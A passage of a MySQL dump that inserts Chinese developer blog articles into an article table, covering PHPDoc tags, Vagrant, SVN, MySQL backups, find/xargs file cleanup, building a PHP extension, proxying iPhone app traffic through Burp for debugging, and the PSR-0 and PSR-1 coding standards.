*/\r\n```\r\n\r\n####@method\r\n该标签用于告诉类哪些**魔术方法**是可以调用的。该标签只能用于class和interface。\r\n```php\r\n@method [return type][name]([[type][parameter]<,...>])[<description>]\r\n```\r\n例子：\r\n```php\r\nclass Parent\r\n {\r\n     public function __call()\r\n     {\r\n         <...>\r\n     }\r\n }\r\n\r\n /**\r\n  * @method string getString()\r\n  * @method void setInteger(integer $integer)\r\n  * @method setString(integer $integer)\r\n  */\r\n class Child extends Parent\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@package\r\n用于在逻辑的目录结构中组织元素，该标签一般用于模拟实现命名空间，所以，对于包名，一般使用`\\`作为分隔符。\r\n\r\n理论上说，`@package`的目录级别是无限的，但是推荐限制级别在六级以内，同时，也允许使用`_`或者是`.`作为分隔符，当然，并不推荐这样使用，这样只是为了项目向后兼容考虑。\r\n\r\n```php\r\n@package [level 1]\\[level 2]\\[etc.]\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @package PSR\\Documentation\\API\r\n  */\r\n```\r\n> 该标签`@package`用于取代已经弃用的`@category`标签，同时，`@subpackage`也被弃用了。\r\n\r\n####@param\r\n该标签用于说明函数或者方法的一个参数。\r\n```php\r\n@param [Type][name][<description>]\r\n```\r\n例子：\r\n```php\r\n/**\r\n  * Counts the number of items in the provided array.\r\n  *\r\n  * @param mixed[] $items Array structure to count the elements of.\r\n  *\r\n  * @return int Returns the number of elements.\r\n  */\r\n function count(array $items)\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@property\r\n该属性与`@method`类似，用于告诉类他实现了哪些`魔术属性`。\r\n```php\r\n@property [Type][name][<description>]\r\n```\r\n\r\n>一般用在类中实现了`__get()`和`__set()`魔术方法的情况下。\r\n\r\n例如：\r\n```php\r\nclass Parent\r\n {\r\n     public function __get()\r\n     {\r\n         <...>\r\n     }\r\n }\r\n\r\n /**\r\n  * @property string $myProperty\r\n  */\r\n class Child extends Parent\r\n {\r\n     <...>\r\n }\r\n```\r\n> 同类型的属性还有`@property-read`和`@property-write`，这两个属性与`@property`作用相同，区别在于一个在于说明属性只读(`__get()`)，一个只写(`__set()`)。\r\n\r\n####@return\r\n用于说明函数或者方法的返回值，需要注意的是，如果不提供该参数，则隐含的说明返回值为void，即`@return void`。\r\n```php\r\n@return [Type][<description>]\r\n```\r\n例子：\r\n```php\r\n/**\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n/**\r\n  * @return string|null The label''s text or null if none provided.\r\n  */\r\n function getLabel()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@since\r\n用于表明该文档块自哪个版本开始有效。\r\n```php\r\n@since [version][<description>]\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @since 1.0.1 First time this was introduced.\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n\r\n /**\r\n  * @since 1.0.2 Added the $b argument.\r\n  * @since 1.0.1 Added the $a argument.\r\n  * @since 1.0.0\r\n  *\r\n  * @return void\r\n  */\r\n function dump($a, $b)\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@throws\r\n该标签用于指出是否一个结构化的元素可能会抛出指定类型的异常。\r\n```php\r\n@throws [Type][<description>]\r\n```\r\n例子:\r\n```php\r\n/**\r\n  * Counts the number of items in the provided array.\r\n  *\r\n  * @param mixed[] $array Array structure to count the elements of.\r\n  *\r\n  * @throws InvalidArgumentException if the provided argument is not of type\r\n  *     ''array''.\r\n  *\r\n  * @return int Returns the number of elements.\r\n  */\r\n function count($items)\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@todo\r\n该标签用于表明该元素还需要进行哪些开发。\r\n```php\r\n@todo [description]\r\n```\r\n\r\n例子：\r\n```php\r\n/**\r\n  * Counts the number of items in the provided array.\r\n  *\r\n  * @todo add an array parameter to count\r\n  *\r\n  * @return int Returns the number of elements.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@uses & @used-by\r\n该标签用于说明对其他元素的引用（或者是被引用）。\r\n```php\r\n@uses [其他元素][<description>]\r\n```\r\n\r\n该元素与`@see`之间的区别在于`@see`是单向的，而`@uses`是双向的，也就是说，在被引用的元素中，要添加`@used-by`标签，以便于能够跳转回来。\r\n\r\n例子：\r\n```php\r\n/**\r\n  * @uses MyClass::$items to retrieve the count from.\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@var\r\n该标签用于类的属性。\r\n```php\r\n@var ["Type"][$element_name][<description>]\r\n```\r\n例如:\r\n```php\r\nclass Foo\r\n{\r\n  /** @var string|null Should contain a description */\r\n  protected $description = null;\r\n}\r\n\r\nclass Foo\r\n{\r\n  /**\r\n   * @var string $name        Should contain a description\r\n   * @var string $description Should contain a description\r\n   */\r\n  protected $name, $description;\r\n}\r\n```\r\n\r\n####@version\r\n说明元素的版本。\r\n```php\r\n@version [<vector>][<description>]\r\n```\r\n\r\n版本支持来自版本控制系统的配置，使用语法如下：\r\n```php\r\n版本控制系统名称: $vector$\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @version 1.0.1\r\n  */\r\n class Counter\r\n {\r\n     <...>\r\n }\r\n\r\n /**\r\n  * @version GIT: $Id$ In development. Very unstable.\r\n  */\r\n class NeoCounter\r\n {\r\n     <...>\r\n }\r\n```', '本文对PHP doc的常见标签做了简要的描述，并提供了使用范例，期望能够在代码编写过程中能够提供更加规范的文档。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/0160b93312e02cc560c9da4bf9218a58.jpeg', 'mylxsw', '原创', 1, 0, 1408887041, 1413944045, 0, 'markdown'),
(383, 'Vagrant使用技巧', '###1.1 如何调试\r\n在使用Vagrant过程中，难免会出现一些不稳定的因素而造成一些使用上的bug，因此，Vagrant提供了Debug日志的方式用于调试，可以方便的查找错误的原因，以便快速解决问题。\r\n\r\n要允许启用日志功能，需要在主机上设置环境变量`VAGRANT_LOG`为需要的日志级别，包含`debug`, `info`, `warn`, `error`。当你需要查找错误产生的原因的时候，通常使用日志级别`info`，这种情况下你可以得到包含重要信息的比较干净的日志。\r\n\r\n在Linux和Mac系统上，你可以通过下面的方式设置：\r\n\r\n```shell\r\n$ VAGRANT_LOG=info vagrant up\r\n```\r\n\r\n在Windows下，你需分开写:\r\n\r\n```shell\r\n$ set VAGRANT_LOG=info\r\n$ vagrant up\r\n```\r\n\r\n当然，你也可以不用这种方式，只需要在启动的时候增加参数`--debug`即可。\r\n\r\n```shell\r\n$ vagrant up --debug\r\n```\r\n\r\n###1.2 如何使用插件\r\nVagrant中提供了很多可以直接使用的插件，使用这些插件，可以极大的减少配置开发环境的工作量，Vagrant的大部分核心功能都是基于插件实现的。\r\n\r\nVagrant使用命令`vagrant plugin install`安装插件。\r\n```shell\r\n$ vagrant plugin install vagrant-example-plugin\r\n```\r\n\r\n插件安装完成后，将会在Vagrant启动的时候自动加载，如果插件加载过程中出现错误，不会影响Vagrant的启动，而是会输出插件加载失败的错误信息。\r\n\r\n插件安装完成后，你应该查看插件开发文档获取如何使用该插件，一般可以通过vagrant命令使用插件的命令，如果插件提供了provision的话，可以通过`config.vm.provision`进行配置。\r\n\r\n插件的更新比较简单，使用命令`vagrant plugin update`即可更新全部插件，使用`vagrant plugin update NAME`可以更新指定插件。\r\n\r\n插件卸载使用命令`vagrant plugin uninstall`。\r\n```shell\r\n$ vagrant plugin uninstall vagrant-example-plugin\r\n```\r\n查看安装了哪些插件：\r\n```shell\r\nvagrant plugin list\r\n```\r\n\r\n###1.3 如何配置网络\r\n\r\n在Vagrant中，所有的网络配置都在`Vagrantfile`中的`config.vm.network`方法中。\r\n\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  # other config here\r\n\r\n  config.vm.network "forwarded_port", guest: 80, host: 8080\r\nend\r\n```\r\n每一种网络类型都有一个标识符如`:forwarded_port`，它后面跟着一串配置选项。在端口跳转的例子中，提供了两个参数，虚拟机中的端口号和主机中映射的端口号。\r\n\r\n> 如果需要多个网络配置，使用多个`config.vm.network`即可。\r\n\r\n#### 如何进行端口跳转\r\n端口跳转功能允许你通过TCP或者是UDP直接访问主机上的指定端口，该端口的请求会被转发到虚拟机上的指定端口。\r\n\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  config.vm.network "forwarded_port", guest: 80, host: 8080\r\nend\r\n```\r\n上面的配置将会主机上对8080端口的访问转发到虚拟机上的80端口。\r\n\r\n下面是该配置(`forwarded_port`)支持的参数:\r\n\r\n- **guest (int)** 希望暴漏给主机的虚拟机端口\r\n- **guest_ip(string)** 希望绑定的IP，该IP与guest指定的端口暴漏给主机，默认为空，所有网卡接口。\r\n- **host(int)** 希望使用来访问虚拟机的guest端口的主机端口号\r\n- **host_ip(string)** 主机的IP地址，用于绑定到跳转的端口，如果不指定，则使用所有IP。\r\n- **protocol(string)** 可选tcp或者udp,默认为tcp.\r\n\r\n\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  config.vm.network "forwarded_port", guest: 2003, host: 12003, protocol: ''tcp''\r\n  config.vm.network "forwarded_port", guest: 2003, host: 12003, protocol: ''udp''\r\nend\r\n```\r\n\r\n###1.4 如何配置同步目录\r\n使用`config.vm.synced_folder`方法配置同步目录。\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  # other config here\r\n\r\n  config.vm.synced_folder "src/", "/srv/website"\r\nend\r\n```\r\n以上配置中，`synced_folder`方法的第一个参数为主机上要跟虚拟机同步的目录，第二个参数为要挂载到虚拟机上的路径。\r\n\r\n> 可以配置参数`disabled: true`禁止目录同步。\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  config.vm.synced_folder "src/", "/srv/website", disabled: true\r\nend\r\n```\r\n\r\n默认情况下，Vagrant设置同步文件夹的属主/组为SSH用户，如果需要修改的话，使用下面配置:\r\n```ruby\r\nconfig.vm.synced_folder "src/", "/srv/website",\r\n  owner: "root", group: "root"\r\n```\r\n', '在使用Vagrant过程中，难免会出现一些不稳定的因素而造成一些使用上的bug，因此，Vagrant提供了Debug日志的方式用于调试，可以方便的查找错误的原因，以便快速解决问题。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/81b2bd06ba23e247f9c2a0bfda36c047.jpg', 'mylxsw', '原创', 1, 0, 1409071441, NULL, NULL, 'markdown'),
(389, 'SVN操作技巧', '####SVN 分支合并修改合并到主干上\r\n\r\n在主干分支上执行下面命令\r\n```shell\r\n$ svn merge --reintegrate 分支URL/album_mdl.php\r\n--- Merging differences between repository URLs into ''album_mdl.php'':\r\nU    album_mdl.php\r\n--- Recording mergeinfo for merge between repository URLs into ''album_mdl.php'':\r\n U   album_mdl.php\r\n```\r\n\r\n####SVN 创建分支\r\n执行一下命令可以创建一个分支。\r\n```shell\r\n$ svn cp -m ''create new branch for dev'' http://主干地址 http://分支地址\r\n```\r\n\r\n####SVN删除分支\r\n```shell\r\n$ svn rm http://分支地址 -m ''delete the dev branch''\r\n```\r\n\r\n####SVN分支同步主干最新内容\r\n需要在分支目录中执行如下命令\r\n```shell\r\n$ svn merge http://主干地址\r\n```\r\n\r\n####SVN回滚缓存的改变\r\n```shell\r\n$ svn revert . -R\r\n```\r\n\r\n####SVN 替换服务地址\r\n```shell\r\n$ svn switch --relocate 原仓库ROOT地址  新仓库ROOT地址\r\n```', 'SVN操作技巧收集，持续更新中。。。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/6078c895f95a3d8008aebdb4a88519c8.jpg', 'mylxsw', '原创', 1, 0, 1412048700, 1414401107, 0, 'markdown'),
(384, '使用正则表达式转换javascript对象为合法Json', '在使用Python的`json`模块解析json字符串的时候出现如下错误：\r\n\r\n```shell\r\nValueError: Expecting property name: line 1 column 2 (char 1)\r\n```\r\n获取的原始json字符串为\r\n```javascript\r\n{loginFlag: ''LOGIN_FLAG'',page: 0,hasNextPage: true,errmsg: '''',order: ''asc'',type: ''list'',previewSign:'''',fileNum: 2}\r\n```\r\n从上面这段代码中可以看出，该段代码并不是合法的json格式，而是一个javascript对象（关于javascript对象与json的区别，请[参考](http://aicode.cc/article/344.html)）。\r\n\r\n因此，需要首先将上述的代码转换成合法的json格式，也就是所有的key/value应该是用双引号`"`包含起来，而不是`''`。\r\n\r\n使用Python代码如下，需要先导入`re`模块（`import re`）。\r\n\r\n```python\r\ndef replace(m):\r\n    return ''"%s":'' % m.group(1)\r\n\r\ndef replace2(m):\r\n    return '': "%s"'' % m.group(1).strip("''")\r\n\r\n# resp为上述的javascript对象字符串\r\nmatch = re.sub(r''([a-zA-Z_]+[a-zA-Z0-9_]+):'', replace, resp)\r\nmatch = re.sub(":\\s?(''.*?'')", replace2, match)\r\n```\r\n\r\n上面代码中使用了两处正则表达式替换，第一次调用`re.sub`替换了所有key为双引号包含格式，第二次替换所有的value的单引号为双引号。\r\n\r\n```python\r\nprint json.loads(match)\r\n```\r\n正确输出了Json格式的内容：\r\n```shell\r\n{u''hasNextPage'': True, u''previewSign'': u'''', u''loginFlag'': u''LOGIN_FLAG'', u''page'': 0, u''fileNum'': 2, u''type'': u''list'', u''order'': u''asc'', u''errmsg'': u''''}\r\n```\r\n', '在使用Python的`json`模块解析json字符串的时候出现如下错误：ValueError: Expecting property name: line 1 column 2 (char 1)', 'http://agiledev-arsenals.stor.sinaapp.com/cover/7e1be4efb49b840391d3757f86b28bb6.jpg', 'mylxsw', '原创', 1, 0, 1409826455, NULL, NULL, 'markdown'),
(385, '清除、移动目录下指定类型的文件', '###清除目录下所有的**.svn**文件\r\n```shell\r\nfind . -type d -name ".svn"|xargs rm -fr\r\n```\r\n该命令中，`-type`用于指定查找的文件类型，`d`为目录类型（如果为`f`则为标准文件），`-name`指定查找的文件名称为`.svn`。   \r\n`xargs`命令将`find`查找到的列表按照每一行分成一段，对每一段执行`rm -fr`命令。\r\n\r\n对于xargs命令的使用，可以举个例子，创建文件touchlist.txt,文件内容如下：\r\n```vim\r\nfile1\r\nfile2\r\nfile3\r\nfile4\r\n```\r\n执行命令`cat touchlist.txt|xargs touch`，可以看到，当前目录下自动创建了如下文件：\r\n```shell\r\nlocalhost:test mylxsw$ ll\r\ntotal 8\r\n-rw-r--r--  1 mylxsw  staff   0  9 12 11:56 file1\r\n-rw-r--r--  1 mylxsw  staff   0  9 12 11:56 file2\r\n-rw-r--r--  1 mylxsw  staff   0  9 12 11:56 file3\r\n-rw-r--r--  1 mylxsw  staff   0  9 12 11:56 file4\r\n-rw-r--r--  1 mylxsw  staff  24  9 12 11:55 touchlist.txt\r\n```\r\n\r\n> 要清理目录下所有指定的文件，可以使用命令`find . -type f -name "*.xml" -print0|xargs -0 rm -fr`，该命令解决了文件名中包含空格而出现的`xargs: unterminated quote`错误。\r\n\r\n###移动指定目录下指定类型的文件\r\n\r\n```shell\r\n# find . -name "*.mkv"|xargs -I {} mv {} /dest/\r\n```', '本文讲解了如何清除目录下指定类型的文件，如清理目录下的.svn文件。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/13ebb708b245bf25a03070a02fe18c12.jpg', 'mylxsw', '原创', 1, 0, 1410494721, 1413943769, 0, 'markdown'),
(387, 'Cent OS 下安装php扩展：wbxml', '在一个PHP项目中，需要用到这样一种功能，将XML与WBXML之间进行转换，以便进行数据的传输与解析，自己实现一个这样的转换函数的话，显然难度比较大，终于找到一个PHP的Pecl扩展，提供了直接进行转换的函数，但是安装过程比较曲折，因此记录一下。\r\n\r\n首先想到的自然是使用`Pecl`进行安装，于是，便有了下面的安装过程：\r\n\r\n```shell\r\n# pecl install wbxml\r\ndownloading wbxml-1.0.3.tgz ...\r\nStarting to download wbxml-1.0.3.tgz (5,260 bytes)\r\n.....done: 5,260 bytes\r\n3 source files, building\r\nrunning: phpize\r\nCannot find config.m4.\r\nMake sure that you run ''/usr/bin/phpize'' in the top level source directory of the module\r\n\r\nERROR: `phpize'' failed\r\n```\r\n\r\n安装失败了，提示`phpize`执行失败，没事，手动下载下来编译不就行了。\r\n\r\n```shell\r\n# pecl download wbxml\r\n# tar -zxvf wbxml-1.0.3.tgz\r\n# cd wbxml-1.0.3\r\n# phpize\r\n# ./configure\r\n这里出错了，提示没有找到libwbxml类库，具体错误信息找不到了\r\n```\r\n\r\n接下来，需要安装`libwbxml`类库，尝试使用`yum`进行安装，发现根本无法找到这个类库，无奈，只能下载下来自己编译了。   \r\n于是，从git上下载下来源码进行编译安装。\r\n\r\n```shell\r\n# wget https://codeload.github.com/libwbxml/libwbxml/zip/master\r\n# unzip master\r\n# cd libwbxml-master/\r\n# mkdir build\r\n# cmake . -B./build\r\n# cd build/\r\n# make\r\n# make install\r\n```\r\n\r\n终于安装完成`libwbxml`了，接下来再次尝试使用pecl安装wbxml，得到的结果依旧是之前的错误，于是再次源码编译安装，这次提示找不到一些头文件，如`wbxml.h`等。\r\n\r\n于是想了个比较暴力的手段，系统查找到这些头文件，直接复制到wbxml扩展的安装目录下。\r\n\r\n```shell\r\n# find / -name "wbxml.h"\r\n# cp /usr/local/include/libwbxml-1.0/wbxml/wbxml.h ./\r\n```\r\n\r\n头文件也有了，这下总该可以安装了吧。\r\n\r\n```shell\r\n# make\r\n# make install\r\n```\r\n\r\n安装成功，终于安装完成这个扩展了`/usr/lib64/php/modules/wbxml.so`，接下来就是配置一下PHP使用这个扩展了，就不多说了。', '在一个PHP项目中，需要用到这样一种功能，将XML与WBXML之间进行转换，以便进行数据的传输与解析，自己实现一个这样的转换函数的话，显然难度比较大，终于找到一个PHP的Pecl扩展，提供了直接进行转换的函数，但是安装过程比较曲折，因此记录一下。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/e32761a633a75aab704c5e092f5747dd.png', 'mylxsw', '原创', 1, 0, 1411458879, 1411459213, 0, 'markdown'),
(388, 'MySQL常用操作', '###MySQL数据库备份与恢复\r\n\r\n从MySQL导出数据库到SQL文件可以使用`mysqldump`命令。\r\n\r\n```shell\r\n# mysqldump -uroot 数据库名称 > 文件名.sql\r\n```\r\n\r\n将导出到`文件名.sql`导入到mysql：\r\n\r\n```shell\r\n# mysql -uroot -proot 数据库名称< 文件名.sql\r\n```\r\n\r\n> 如果没有该数据库的话，需要先创建 `mysql> create database 数据库名称`。\r\n\r\n###时间戳转换为日期\r\n下面的`add_time`字段存储的是UNIX时间戳，通常在web开发中，使用PHP的time()函数生成，但是查询的时候为了更加友好的展示，使用`FROM_UNIXTIME()`函数进行转换。\r\n```bash\r\nmysql> select id, from_unixtime(add_time) from table_name order by add_time desc;\r\n```', '本文记录了在使用MySQL过程中经常会遇到的一些问题，持续更新中', 'http://agiledev-arsenals.stor.sinaapp.com/cover/296ea29cffcf951edd3f1b24ce7ab7ae.jpg', 'mylxsw', '原创', 1, 0, 1411636625, 1418806497, 0, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(391, 'Mac下对iPhone应用网络抓包', '在网络开发的时候，经常会遇到需要对手机中的APP的网络访问进行抓包的需要，手机不同于电脑，可以安装各种抓包工具，对网络数据进行监控或者修改，因此本文讲述了使用Mac系统对iPhone手机进行抓包的一种方式，当然，这种方式并不仅仅局限于对iPhone进行抓包，任何Android手机同样也是支持的。\r\n\r\n####需要的软件：\r\n\r\n- Burp([下载地址](http://cloud.letv.com/s/zKQCtu7Xe)) , Windows下可以使用fiddler2，会更加方便。\r\n​\r\n\r\n####具体操作：\r\n\r\n首先，在Mac系统中，`系统偏好设置 - 共享 - 互联网共享` 开启网络共享功能。\r\n\r\n> 注： 如果手机和电脑在同一个wifi网络下，可以不用执行第一步。\r\n\r\n打开Burp，进入到`Proxy`选项卡下，找到`Option`子选项卡，在第一栏中，修改`Proxy Listeners`部分，将监听接口绑定修改为`All interfaces`， 也就是interface栏应该显示`*:8080`。\r\n\r\n> 注： 最好进入到`Intercept`选项卡下，将`Intercept is on`按钮按下，使其显示为`intercept is off`，这样就可以避免Brup将请求拦截后停止，不需要手动继续了。\r\n\r\n接下来配置手机部分，进入iPhone的`设置-无线局域网`，选择刚才创建的Wifi，然后连接上去，点击网络名称右侧的感叹号，修改网路信息，将下面的`HTTP 代理`修改为手动，填写Mac的IP地址和端口号（`8080`）。\r\n\r\n![iPhone网络配置](http://agiledev-arsenals.stor.sinaapp.com/photos/4c9b8ea151f9d6718e85c66d3221c5a1.jpeg)\r\n\r\n> Mac的IP地址可以通过命令`ifconfig`查看到，没有配置网络共享的也是执行一样的操作，当然，要保证Mac和iPhone在同一个局域网中。\r\n\r\n\r\n最后，回到Mac，打开Burp的`HTTP history`子选项卡，在手机上运行要监控的APP，然后就可以在这里看到所有的HTTP访问请求了。\r\n\r\n![网络监控](http://agiledev-arsenals.stor.sinaapp.com/photos/3ad80c48c33f24b8bd6904c8c41d3375.png)', '在网络开发的时候，经常会遇到需要对手机中的APP的网络访问进行抓包的需要，手机不同于电脑，可以安装各种抓包工具，对网络数据进行监控或者修改，因此本文讲述了使用Mac系统对iPhone手机进行抓包的一种方式，当然，这种方式并不仅仅局限于对iPhone进行抓包，任何Android手机同样也是支持的。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/5730feb4fd50db7bde69cf6383e878d0.png', 'mylxsw', '原创', 1, 0, 1413788901, 1413789554, 0, 'markdown'),
(392, 'PHP代码标准：PSR-0 自动加载标准', '下面描述了实现自动加载器互用性必须遵循的强制性要求。\r\n\r\n强制性\r\n---------\r\n\r\n* 一个全称的命名空间和类必须遵循下列结构  `\\<Vendor Name>\\(<Namespace>\\)*<Class Name>`。\r\n* 每一个命名空间必须有一个顶级的命名空间（“厂商名称”）。\r\n* 每个命名空间可以按照它的需要来创建多个子命名空间。\r\n* 在从文件系统载入文件的时候，每一个命名空间分隔符被转换为 `DIRECTORY_SEPARATOR`。\r\n* 在类名中的每一个 `_` 字符将被转换为一个 `DIRECTORY_SEPARATOR`。 字符 `_` 在命名空间中没有特殊的含义。\r\n* 当从文件系统加载文件的时候，全称的命名空间和类以 `.php` 结尾。\r\n* 厂商名称，命名空间和类名可以是任何小写和大写字母的组合。\r\n\r\n范例\r\n--------\r\n\r\n* `\\Doctrine\\Common\\IsolatedClassLoader` => `/path/to/project/lib/vendor/Doctrine/Common/IsolatedClassLoader.php`\r\n* `\\Symfony\\Core\\Request` => `/path/to/project/lib/vendor/Symfony/Core/Request.php`\r\n* `\\Zend\\Acl` => `/path/to/project/lib/vendor/Zend/Acl.php`\r\n* `\\Zend\\Mail\\Message` => `/path/to/project/lib/vendor/Zend/Mail/Message.php`\r\n\r\n命名空间和类名中的下划线\r\n-----------------------------------------\r\n\r\n* `\\namespace\\package\\Class_Name` => `/path/to/project/lib/vendor/namespace/package/Class/Name.php`\r\n* `\\namespace\\package_name\\Class_Name` => `/path/to/project/lib/vendor/namespace/package_name/Class/Name.php`\r\n\r\n这里我们设置的标准应该是可互用的自动加载器的最低标准。你可以利用这个能够加载PHP 5.3的类的简单的SplClassLoader实现测试代码是否遵循了这些标准。\r\n\r\n范例实现\r\n----------------------\r\n\r\n下面是一个能够简要实现上面提议标准的自动加载器的范例函数。\r\n\r\n```php\r\n<?php\r\n\r\nfunction autoload($className)\r\n{\r\n    $className = ltrim($className, ''\\\\'');\r\n    $fileName  = '''';\r\n    $namespace = '''';\r\n    if ($lastNsPos = strrpos($className, ''\\\\'')) {\r\n        $namespace = substr($className, 0, $lastNsPos);\r\n        $className = substr($className, $lastNsPos + 1);\r\n        $fileName  = str_replace(''\\\\'', DIRECTORY_SEPARATOR, $namespace) . DIRECTORY_SEPARATOR;\r\n    }\r\n    $fileName .= str_replace(''_'', DIRECTORY_SEPARATOR, $className) . ''.php'';\r\n\r\n    require $fileName;\r\n}\r\n```\r\n\r\nSplClassLoader 实现\r\n-----------------------------\r\n\r\n下面的gist是一个SplClassLoader实现的例子，如果你遵循上述的自动加载器互用性标准，那它就能够加载你的类。\r\n这也是遵循上述标准，用于加载PHP 5.3中的类的推荐做法。\r\n\r\n* [http://gist.github.com/221634](http://gist.github.com/221634)\r\n', '下面描述了实现自动加载器互用性必须遵循的强制性要求。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/81c1b9c5b26f4edab34d81dec43fc267.png', 'mylxsw', '翻译', 1, 0, 1413943058, 1413943682, 0, 'markdown'),
(393, 'PHP代码标准：PSR-1 基本编码标准', '标准的本章节包含了在共享的PHP代码中，要保证高级别的技术互用性所应该考虑到的标准编码元素。\r\n\r\n本文档中的关键字“必须”， “不允许”，“必需”，“将会”，“将不会”，“应该”，“不应该”，“推荐”，“可以”和“可选”遵循[RFC 2119]中的描述。\r\n\r\n[RFC 2119]: http://www.ietf.org/rfc/rfc2119.txt\r\n[PSR-0]: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md\r\n[PSR-4]: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-4-autoloader.md\r\n\r\n\r\n1. 概述\r\n-----------\r\n\r\n- 文件必须仅使用`<?php`和`<?=`标签。\r\n\r\n- PHP代码文件必须仅使用UTF-8无BOM的编码方式。\r\n\r\n- 同一个文件应该只用来做符号声明（类，函数，常来等等）或者影响程序行为（例如生成输出，修改.ini配置），但是不应该两者都做。\r\n\r\n- 命名空间和类必须遵循“自动加载标准” PSR: [[PSR-0], [PSR-4]]。\r\n\r\n- 类名必须以`大驼峰拼写法`方式声明。\r\n\r\n- 类常量的声明必须全部为大写字母和下划线。\r\n\r\n- 方法名必须以`小骆驼拼写法`命名。\r\n\r\n\r\n2. 文件\r\n--------\r\n\r\n### 2.1. PHP 标签\r\n\r\nPHP代码必须使用 `<?php ?>` 标签或者 `<?= ?>` 标签； 不允许使用其它标签变体。\r\n\r\n### 2.2. 字符编码\r\n\r\nPHP代码必须仅使用UTF-8无BOM的编码格式。\r\n\r\n### 2.3. 行为影响\r\n\r\n一个文件应该用于声明新的符号（类，函数，常量等），并且不会影响程序行为，\r\n或者应该用于执行影响程序行为的逻辑，但是不应该两者都具有。\r\n\r\n术语“影响行为”意味着执行逻辑不能直接与类、函数、常量等的声明相关联，*仅仅通过文件包含相关联*。\r\n\r\n“影响行为”包含但是并不局限与：生成输出，显式的使用`require`或者`include`，\r\n连接外部服务，修改ini配置，产生错误或者异常，修改全局或者静态的变量，对文件进行读写等等。\r\n\r\n下面是一个同一个文件中包含声明和影响行为的代码的例子，应该避免这种代码:\r\n\r\n```php\r\n<?php\r\n// 行为影响: 修改ini配置\r\nini_set(''error_reporting'', E_ALL);\r\n\r\n// 行为影响: 载入一个文件\r\ninclude "file.php";\r\n\r\n// 行为影响: 生成输出\r\necho "<html>\\n";\r\n\r\n// 声明\r\nfunction foo()\r\n{\r\n    // 函数体\r\n}\r\n```\r\n\r\n下面是一个只包含声明，但是不包含影响行为的的例子：\r\n\r\n```php\r\n<?php\r\n// 声明\r\nfunction foo()\r\n{\r\n    // 函数体\r\n}\r\n\r\n// 条件声明 *不是* 行为影响\r\nif (! function_exists(''bar'')) {\r\n    function bar()\r\n    {\r\n        // 函数体\r\n    }\r\n}\r\n```\r\n\r\n\r\n3. 命名空间和类名\r\n----------------------------\r\n\r\n命名空间和类必须遵循“自动加载标准” PSR：[[PSR-0], [PSR-4]]。\r\n\r\n这意味着每一个类单独一个文件，并且命名空间至少要有一级：顶级厂商名称。\r\n\r\n类名必须以`大驼峰拼写法`命名。\r\n\r\n在PHP 5.3及之后的代码必须使用正式的命名空间。\r\n\r\n例如:\r\n\r\n```php\r\n<?php\r\n// PHP 5.3 and later:\r\nnamespace Vendor\\Model;\r\n\r\nclass Foo\r\n{\r\n}\r\n```\r\n\r\n在PHP 5.2.x和之前写的代码应该使用以`Vendor_`为前缀的伪命名空间惯例。\r\n\r\n```php\r\n<?php\r\n// PHP 5.2.x and earlier:\r\nclass Vendor_Model_Foo\r\n{\r\n}\r\n```\r\n\r\n4. 类常量，属性和方法\r\n-------------------------------------------\r\n\r\n术语“类”指的是所有的类，接口和Traits。\r\n\r\n### 4.1. 常量\r\n\r\n类常量必须仅使用大写字母和下划线进行声明。\r\n例如:\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Model;\r\n\r\nclass Foo\r\n{\r\n    const VERSION = ''1.0'';\r\n    const DATE_APPROVED = ''2012-06-01'';\r\n}\r\n```\r\n\r\n### 4.2. 属性\r\n\r\n本文档有意的避免给出除了`大驼峰拼写法`，`小驼峰拼写法`或者`小写下划线`之外的任何建议。\r\n\r\n无论使用何种命名惯例，都应该始终如一的在一个合理的范围内使用。\r\n这个范围可能是厂商级别，包级别，类级别或者是方法级别。\r\n\r\n### 4.3. 方法\r\n\r\n方法名必须以`小写驼峰拼写法`声明。\r\n', '标准的本章节包含了在共享的PHP代码中，要保证高级别的技术互用性所应该考虑到的标准编码元素。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/81c1b9c5b26f4edab34d81dec43fc267.png', 'mylxsw', '翻译', 1, 0, 1413943157, 1413943670, 0, 'markdown'),
